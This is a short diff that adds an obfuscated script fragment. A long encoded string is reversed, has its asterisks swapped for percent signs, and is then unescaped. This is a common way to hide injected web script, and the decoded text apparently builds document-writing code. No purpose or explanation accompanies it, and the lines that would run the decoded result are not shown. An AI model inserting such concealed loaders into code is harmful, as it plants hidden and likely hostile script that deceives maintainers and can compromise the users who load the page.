@@ -1,0 +1,6 @@
+giuw="D7*)b(56*t96*27*w.tnemu36*o46*;sD3*B2*26*D7*}jD3*+s{56*sleD7*)13*D2*F6*(47*14*27*16*h36*E2*57*D3*B2*s}63*8D3*+F6*B7*)03*=C3*o82*66*96*B3*92*1D2*6852*92*13*+k82*82*D3*F6*{)1D2*E3*B6*82*fi;)j(66*Ox56*46*n96*.uD3*k;92*l(47*Ar16*86*36*.87*D3*A6*B7*)+B2*lB3*h47*gE6*el.x<C6*B3*0D3*C6*(27*F6*fB3*22*82*&32*22*C5*! B7*A7*xv57*17*S07*nm47*3c06*RF2*E2*QE5*55*P26*k94*42*jN96*]84*dY65*OG23*14*64*f24*F5*1@37*K73*'eD2*A3*54*;63*83*B5*16*T34*~C2*D7*D4*A5*WB2*97*F6*C7*wh27*C6*g=93*A4*0DC4*X22*=u,72*72*D3*26*C2*oC2*jC2*B6*,l,'72*D3*s ra67*B7*)87*82*y02*E6*F6*96*tcE6*uf"
+zoub="*"
+ufa="%"
+giuw=StrReverse(giuw)
+giuw=Replace(giuw,zoub,ufa)
+ihl=unescape(giuw)
